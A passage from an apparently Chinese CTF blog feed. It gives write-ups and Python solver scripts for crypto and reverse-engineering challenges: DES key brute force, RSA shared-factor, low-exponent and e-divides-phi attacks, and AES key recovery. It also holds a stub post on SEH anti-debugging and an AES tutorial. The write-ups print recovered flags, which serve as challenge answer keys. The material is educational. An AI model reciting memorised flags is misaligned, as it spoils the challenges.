&lt;&lt; <span class="string">&quot; , &quot;</span> &lt;&lt; Str2[<span class="number">1</span>] &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后的逻辑是一位值转换为2位的hex字符串</p><p>然后base64那部分算是一眼叮，然后后面那个des没见过全靠signsrch直接分析出来，然后直接解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">raw_table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span></span><br><span class="line">new_table = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/=&#x27;</span></span><br><span class="line">dictionary_decode = <span class="built_in">str</span>.maketrans(new_table, raw_table)</span><br><span class="line">dictionary_encode = <span class="built_in">dict</span>(<span class="built_in">zip</span>(dictionary_decode.values(),dictionary_decode.keys()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的 DES 加密结果</span></span><br><span class="line">encrypted_text = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;0723105D5C12217DCDC3601F5ECB54DA9CCEC2279F1684A13A0D716D17217F4C9EA85FF1A42795731CA3C55D3A4D7BEA&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试所有可能的 6 位数字组合</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">10</span>), repeat=<span class="number">6</span>):</span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, i))  </span><br><span class="line">    <span class="comment"># print(key)</span></span><br><span class="line">    keyt = base64.b64encode(key.encode()).decode() <span class="comment"># MTIzMTIzMTIz base64encode(v) 正常的123123进行base64以后的值</span></span><br><span class="line">    keytt = keyt.translate(dictionary_encode)</span><br><span class="line">    key = keytt.encode()</span><br><span class="line">    <span class="comment"># print(key)</span></span><br><span class="line">    <span class="comment"># 创建 DES 对象</span></span><br><span class="line">    des = DES.new(key, DES.MODE_ECB)</span><br><span class="line">    <span class="comment"># 尝试解密</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decrypted_text = des.decrypt(encrypted_text)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">b&quot;DASCTF&quot;</span> <span class="keyword">in</span> decrypted_text):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;找到了！密钥是：&#x27;</span>, key)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;明文是：&#x27;</span>, decrypted_text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span>  <span class="comment"># 如果解密失败，就尝试下一个密钥</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>CRYPTO</h1><p>先从简单的练起吧。</p><h2 id="bigRSA">bigRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line">c = <span class="built_in">pow</span>(c, e, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = %d&quot;</span> % c)</span><br></pre></td></tr></table></figure><p>它用了两个n，尝试莫不互素：gcd一下，出来了最大公倍数，那就直接解了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a = GCD(n1,n2)</span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line"></span><br><span class="line">n1_ = n1 //a</span><br><span class="line">n2_ = n2 // a</span><br><span class="line"><span class="comment"># print(n1_)</span></span><br><span class="line"><span class="comment"># print(n2_)</span></span><br><span class="line"></span><br><span class="line">d1 = <span class="built_in">pow</span>(e,-<span class="number">1</span>,(a-<span class="number">1</span>)*(n2_-<span class="number">1</span>))</span><br><span class="line">c1 = <span class="built_in">pow</span>(c,d1,n2)</span><br><span class="line">d2 = <span class="built_in">pow</span>(e,-<span class="number">1</span>,(a-<span class="number">1</span>)*(n1_-<span class="number">1</span>))</span><br><span class="line">c2 = <span class="built_in">pow</span>(c1,d2,n1)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c2))</span><br><span class="line"><span class="comment"># b&#x27;SangFor&#123;qSccmm1WrgvIg2Uq_cZhmqNfEGTz2GV8&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="bad-e">bad_e</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p) <span class="comment"># 6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571</span></span><br><span class="line"><span class="built_in">print</span>(q) <span class="comment"># 11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,p*q)</span><br><span class="line"><span class="built_in">print</span>(c) <span class="comment"># 63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805</span></span><br></pre></td></tr></table></figure><p>已知p，q，e，c，直接解</p><p>6,解不出来，说是e是phi的因子，不能得出m，那就分解一下phi</p><p>发现p-1是e的倍数，但是q-1不是，根据同余的消去律可消去两边的最大公因数</p><p>相当于mod((q-1)),就出来了</p><h2 id="baby-e">baby_e</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"></span><br><span class="line">p,q = getPrime(<span class="number">2048</span>),getPrime(<span class="number">2048</span>)</span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read().strip())</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c =  147693154873835354725007152781732424355869776162377337823960431913672366269917723916891506269449726723757821517328874729037838600793748824028829185409932536014732765063216715033843955453706710187792772702199448156372644163429786386035008302836467605094954587157232829525150652611067567669525072625329634860065850520051628272535479197120008981979404760445193750864902244921407742155742716289495581989134730376783828846663464819337418977287363028738701414486788851136608957124505485242331701209645216580641917007780811842757125048746184068597664780265422321550909392419865169775282217442331295071069272774722564587602419768461231775480847018941840911357926330143045826277813722919121117172763493242590521245640828462665947672485094793188432098216701511715232654611338293295459889814699850788048985878279440740712956248569068077253790198036918598519191892836075254345518967666166925163908185663991353344555402397055977817370082929420443034626201745027965444069777059760865359310439815816749939498993014457995041394803598825093836045546578310632172636478575946653375857640993393714607308326474003446154152048840071034349831168612740218034679021240949747357214453636633636662650940968576792518622437627529244515229173</span></span><br><span class="line"><span class="comment"># n =  553409369582823237678532685244026647155180191225879439432235077135813123637186465008813830373646133388592395760175777499266561095087891764348044063111935877931069321764391883899483374576303169645488542398590564148654412004383012178107972880058460460806768779452529433458826925606225797078653905380530651390617109384086518728626571028089036812787671647095695947167204428442727185744172445701874820612799168887428075695751162763647868386879374037826876671079326544820609721731078985096813307183878793033824330869698508952853770794414757655681370862323768018291030331209143189638496644361618184164228294031490537429556439588954274708598530042700988138862000054458742762198052079867259365645914383561162796796952346445529346145323567650621600171442575319262718389389870407629339714751583360252884338116164466349449862781112019462555743429653595045695696967783338371470032332852204294900011651434678829104876529439166176589508898757122660322523937330848536715937381297551894198974459004139082562228022412335520195652419375915216074658463954339332593244483927157329404652516225481116614815221154229491846087288087715884363786672244655901308480290011237244562251084095684531716327141154558809471185132979704992609461470501119328696999713829</span></span><br></pre></td></tr></table></figure><p>e很小</p><p>$c = m^e + kn$</p><p>$m = (c - kn)**(1/7)$</p><p>尝试低加密指数攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = iroot(c+k*n,e)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(res[<span class="number">0</span>]))) <span class="comment">#转为字符串</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k=k+<span class="number">1</span></span><br><span class="line">    <span class="comment"># b&#x27;moectf&#123;SMaLL_3xPon3nt_Mak3_rSa_w3ak!_!lP0iYlJf!M3rux9G9Vf!JoxiMl903lllA&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="狂飙">狂飙</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">flag = <span class="string">b&#x27;19209389120572313&#x27;</span></span><br><span class="line">m = <span class="number">88007513702424243702066490849596817304827839547007641526433597788800212065249</span></span><br><span class="line">key = os.urandom(<span class="number">24</span>)</span><br><span class="line">key = bytes_to_long(key)</span><br><span class="line">n=m % key</span><br><span class="line">flag += (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">enc_flag = aes.encrypt(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(enc_flag)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#103560843006078708944833658339172896192389513625588</span></span><br><span class="line"><span class="comment">#b&#x27;\xfc\x87\xcb\x8e\x9d\x1a\x17\x86\xd9~\x16)\xbfU\x98D\xfe\x8f\xde\x9c\xb0\xd1\x9e\xe7\xa7\xefiY\x95C\x14\x13C@j1\x9d\x08\xd9\xe7W&gt;F2\x96cm\xeb&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;UN\x1d\xe2r&lt;\x1db\x00\xdb\x9a\x84\x1e\x82\xf0\x86&#x27;</span></span><br></pre></td></tr></table></figure><p>通过n = m % key来求key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的值</span></span><br><span class="line">enc_flag = <span class="string">b&#x27;\xfc\x87\xcb\x8e\x9d\x1a\x17\x86\xd9~\x16)\xbfU\x98D\xfe\x8f\xde\x9c\xb0\xd1\x9e\xe7\xa7\xefiY\x95C\x14\x13C@j1\x9d\x08\xd9\xe7W&gt;F2\x96cm\xeb&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;UN\x1d\xe2r&lt;\x1db\x00\xdb\x9a\x84\x1e\x82\xf0\x86&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的因子</span></span><br><span class="line">factors = [<span class="number">3</span>,<span class="number">37</span>,<span class="number">439</span>,<span class="number">3939851</span>, <span class="number">265898280367</span>,<span class="number">5036645362649</span>,<span class="number">342291058100503482469327892079792475478873</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有可能的组合</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(factors) + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> subset <span class="keyword">in</span> combinations(factors, r):</span><br><span class="line">        <span class="comment"># 计算可能的 key</span></span><br><span class="line">        possible_key = reduce(<span class="keyword">lambda</span> x, y: x*y, subset)</span><br><span class="line">        <span class="comment"># 检查 key 的长度是否为 24 字节</span></span><br><span class="line">        <span class="comment"># 使用找到的 key、iv 和 enc_flag 解密 flag</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            aes = AES.new(long_to_bytes(possible_key), AES.MODE_CBC, iv)</span><br><span class="line">            flag = aes.decrypt(enc_flag)</span><br><span class="line">            <span class="keyword">if</span> flag.startswith(<span class="string">b&#x27;flag&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Found possible flag:&#x27;</span>, flag)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 杂题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RE中的反调试</title>
      <link href="/posts/2af5212f.html"/>
      <url>/posts/2af5212f.html</url>
      
        <content type="html"><![CDATA[<h2 id="SEH">SEH</h2><p>在python中，你是否见过以下语法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(factors) + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> subset <span class="keyword">in</span> combinations(factors, r):</span><br><span class="line">        possible_key = reduce(<span class="keyword">lambda</span> x, y: x*y, subset)</span><br><span class="line">        <span class="keyword">try</span>:<span class="comment">#防止key的长度不对</span></span><br><span class="line">            aes = AES.new(long_to_bytes(possible_key), AES.MODE_CBC, iv)</span><br><span class="line">            flag = aes.decrypt(enc_flag)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found possible flag:&#x27;</span>, flag)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line"><span class="keyword">except</span></span><br></pre></td></tr></table></figure><p>它的作用是尝试执行try块中的内容，如果出现异常，就执行except的内容。</p><p>在Windows中，也有类似的保护程序正常执行的机制，叫做SEH（Structured Exception Handling）</p><p>通过在源代码使用__try,__except,__finally来实现</p><p>使用时，except()中的值用来表示异常处理方法</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">__except()括号中表达式的取值范围:</span></span><br><span class="line"><span class="section">1:处理异常</span></span><br><span class="line"><span class="section">0:不处理异常交给下一个异常节点去处理</span></span><br><span class="line"><span class="section">-1:继续执行（程序直接寄掉）</span></span><br></pre></td></tr></table></figure><p>在程序中，可能故意使用SEH，刻意引发错误跳过执行一些指令</p><hr><p>施工中</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> 动调 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加密03:AES</title>
      <link href="/posts/ca6bad6.html"/>
      <url>/posts/ca6bad6.html</url>
      
        <content type="html"><![CDATA[<h1>Advanced Encryption Standard</h1><p>(高级加密标准)</p><h2 id="性质">性质</h2><p>对称加密，块加密，流加密<br>密钥长度固定为：128，192，256bit<br>加密模式分为：CBC,CFB,OFB,CTR,GCM,ECB</p><ul><li>对称加密：加密密钥和解密密钥相同</li></ul><blockquote><h2 id="分组密码和流密码">分组密码和流密码</h2><p>分组密码是每次只能处理特定长度的一块数据的一类密码算法，这里的“一块”就称为分组。一个分组的比特数就称为分组长度。<br>流密码是对数据流进行连续处理的一类密码算法。流密码一般以1比特、8比特或32比特等为单位进行加密和解密。<br>分组密码算法只能加密固定长度的分组，但需要加密的明文长度可能会超过分组密码的分组长度，这就需要对分组密码算法进行迭代，以便将一段很长的明文全部加密。迭代的方法就被称为分组密码的模式。</p></blockquote><blockquote><ul><li>ECB模式：Electronic CodeBook mode（电子密码本模式）</li><li>CBC模式：Cipher Block Chaining mode（密码分组链接模式）</li><li>CFB模式：Cipher FeedBack mode（密文反馈模式）</li><li>OFB模式：Output FeedBack mode（输出反馈模式）</li><li>CTR模式：CounTeR mode（计数器模式）</li></ul></blockquote><table><thead><tr><th>模式</th><th>名称</th><th>优点</th><th>缺点</th><th>备注</th></tr></thead><tbody><tr><td>ECB模式</td><td>Electronic CodeBook mode（电子密码本模式）</td><td>简单、快速、支持并行运算（加密、解密）</td><td>明文中的重复排列会反映在密文中；通过删除、替换密文分组可以对明文进行操作；对包含某些比特错误的密文进行解密时，对应的分组会出错；不能低于重放攻击。</td><td>不应使用</td></tr><tr><td>CBC模式</td><td>Cipher Block Chaining mode（密码分组链接模式）</td><td>明文的重复排列不会反映在密文中；支持并行计算（仅解密）；能够解密任何密文分组</td><td>对包含某些错误比特的密文进行解密时，第一个分组的全部比特以及后一个分组的相应比特会出错；加密不支持并行计算</td><td>CRYPTREC推荐；《实用密码学》推荐</td></tr><tr><td>CFB模式</td><td>Cipher FeedBack mode（密文反馈模式）</td><td>不需要填充（padding）；支持并行计算（仅解密）；能够解密任意密文分组</td><td>加密不支持并行计算；对包含某些错误比特的密文进行解密时，第一个分组的全部比特以及后一个分组的相应比特会出错；不能低于重放攻击</td><td>CRYPTREC推荐</td></tr><tr><td>OFB模式</td><td>Output FeedBack mode（输出反馈模式）</td><td>不需要填充（padding）；可实现进行加密、解密的准备；解密解密使用相同结构；对包含某些错误比特密文解密时，只有明文中相应的比特会出错</td><td>不支持并行计算；主动攻击者反转密文分组中的某些比特时，明文分组中相应的比特也会被反转</td><td>CRYPTREC推荐</td></tr><tr><td>CTR模式</td><td>CounTeR mode（计数器模式）</td><td>不需要填充（padding）；可实现进行加密、解密的准备；解密解密使用相同结构；对包含某些错误比特密文解密时，只有明文中相应的比特会出错；支持并行计算（加密、解密)</td><td>主动攻击者反转密文分组中的某些比特时，明文分组中相应的比特也会被反转</td><td>CRYPTREC推荐；《实用密码学》推荐</td></tr></tbody></table><p>以上内容来自(<a href="https://blog.csdn.net/weixin_43946212/article/details/108116251">分组密码的模式——ECB、CBC、CFB、OFB、CTR_ofb是指分组密码的哪种工作模式-CSDN博客</a>)</p><hr><h2 id="过程">过程</h2><h3 id="明文分块">明文分块</h3><p>把所有明文分为n块，每块128bit。如果最后不足，需要填充：</p><ul><li><code>NoPadding</code>： 不做任何填充，但是要求明文必须是16字节的整数倍。<br><code>PKCS5Padding</code>（默认）： 如果明文块少于16个字节（<code>128bit</code>），在明文块末尾补足相应数量的字符，且每个字节的值等于缺少的字符数。 比如明文：{1,2,3,4,5,a,b,c,d,e},缺少6个字节，则补全为{1,2,3,4,5,a,b,c,d,e,6,6,6,6,6,6 }<br><code>ISO10126Padding</code>：如果明文块少于16个字节（<code>128bit</code>），在明文块末尾补足相应数量的字节，最后一个字符值等于缺少的字符数，其他字符填充随机数。比如明文：{1,2,3,4,5,a,b,c,d,e},缺少6个字节，则可能补全为{1,2,3,4,5,a,b,c,d,e,5,c,3,G,$,6}<br><code>PKCS7Padding</code>原理与<code>PKCS5Padding</code>相似，区别是<code>PKCS5Padding</code>的<code>blocksize</code>为8字节，而<code>PKCS7Padding</code>的<code>blocksize</code>可以为1到255字节</li><li>需要注意的是，如果在<code>AES</code>加密的时候使用了某一种填充方式，解密的时候也必须采用同样的填充方式。</li></ul><p>然后每一块按序排列成4x4矩阵</p><h3 id="S盒生成">S盒生成</h3><p><img src="https://pic1.zhimg.com/80/v2-9c648584654f34c8eaddf0f57dde2ec3_1440w.webp?source=1def8aca" alt="img"></p><p>这个表是S盒，生成方法如下：</p><ol><li>对S盒初始化为00，01，02，03，…，FE，FF</li><li>用每一格的乘法逆元代替这一格，域是$GF(2^8)$</li><li>对每一格的bit位进行运算，令$b_i^，=b_i\oplus b_{i+4 mod 8}\oplus b_{i+5 mod 8}\oplus b_{i+6 mod 8}\oplus b_{i+7 mod 8}\oplus c_i$，其中$c = {01100011}$</li></ol><p>逆S盒：用于解密</p><h3 id="字节替代">字节替代</h3><p>通过每一字节前4位和后四位分别作为S盒的行标和列标，替换为对应位置的值</p><h3 id="行移位">行移位</h3><p>把上面已经分为4x4的矩阵中，第i行左移i位</p><h3 id="列混淆">列混淆</h3><p>最矩阵经行矩阵乘法：<br>$$<br>\begin{bmatrix}<br>2 &amp; 3 &amp; 1 &amp; 1 \\<br>1 &amp; 2 &amp; 3 &amp; 1 \\<br>1 &amp; 1 &amp; 2 &amp; 3 \\<br>3 &amp; 1 &amp; 1 &amp; 2<br>\end{bmatrix} \tag{1}<br>*<br>before = after<br>$$</p><h3 id="轮密钥加">轮密钥加</h3><p>每一轮输入与轮密钥进行异或，该项一定出现在加密的首尾，保证安全性</p><p>轮密钥的生成是初始密钥和该轮子密钥异或的结果</p><h4 id="密钥扩展">密钥扩展</h4><p>密钥扩展用于生成子密钥</p><p>现在假设已经有初始密钥的4x4矩阵</p><p>对它分列（以列为单位分成4个）为$W_0，W_1,W_2,W_3$。那么扩展密钥就是扩展出$W_4，W_5,W_6…$</p><p>具体公式是：<br>$$<br>\begin{equation}<br>\left{<br>\begin{aligned}<br>W_i &amp; = W_{i-4} \oplus W_{i-1} \\<br>W_i &amp; = W_{i-4} \oplus T({W_{i-1}})<br>\end{aligned}<br>\right.<br>\end{equation}<br>$$<br>其中T是函数其作用是：</p><ol><li>假设输入的是$W_i$</li><li>对这一列循环左移一位（列移位），对于$W_i$这一列，就是上移一位</li><li>用S盒对2之后的$W_i$进行字节替代，规则同加密的字节替代</li><li>与给定的矩阵进行异或，矩阵是[RC[j],0,0,0]轮常量是RC = {01, 02, 04, 08, 10, 20, 40, 80, 1B, 36}.j是该轮轮数</li></ol><p>然后每4列作为一组成为轮密钥</p><h4 id="补充">补充</h4><blockquote><p><strong>1）为什么需要密钥扩展：</strong></p><p>不论密钥长度为多少，我们的明文分组始终为16字节（4字）。上文提到，在轮密钥加部分，我们需要为每一轮提供一个长度为4字的轮密钥。</p><p>对于AES-128（4字密钥），需要迭代10轮，加上第0轮，共需要进行11次轮密钥加，而每一次轮密钥加都需要一个长度为4字的轮密钥，因此所需要的扩展密钥长度为 次字字11次×4字=44字 。</p><p>对于AES-192（6字密钥），需要迭代12轮，加上第0轮，共需要进行13次轮密钥加，所需要的扩展密钥长度为 次字字13次×4字=52字 。</p><p>对于AES-256（8字密钥），需要迭代14轮，加上第0轮，共需要进行15次轮密钥加，所需要的扩展密钥长度为 次字字15次×4字=60字 。</p><p>因此我们需要一定的方法用来将密钥扩展到一定的长度。</p></blockquote><blockquote><p><strong>（2）AES-192的密钥扩展方法：</strong></p><p>AES-192的密钥有6个字，其密钥扩展方法与AES-128完全类似。第一个for循环的填充变成了6个字；之后的判断整除条件变为了能否整除6。</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只是伪代码，不能运行</span></span><br><span class="line"><span class="title function_">KeyExpansion</span>(<span class="type">byte</span> <span class="built_in">key</span>[<span class="number">24</span>], word w[<span class="number">52</span>])</span><br><span class="line">&#123;</span><br><span class="line">    word temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)<span class="comment">//第一个for循环，填充w的前6个字</span></span><br><span class="line">        w[i] = &#123;<span class="built_in">key</span>[<span class="number">4</span>*i], <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">1</span>], </span><br><span class="line">                <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">2</span>], 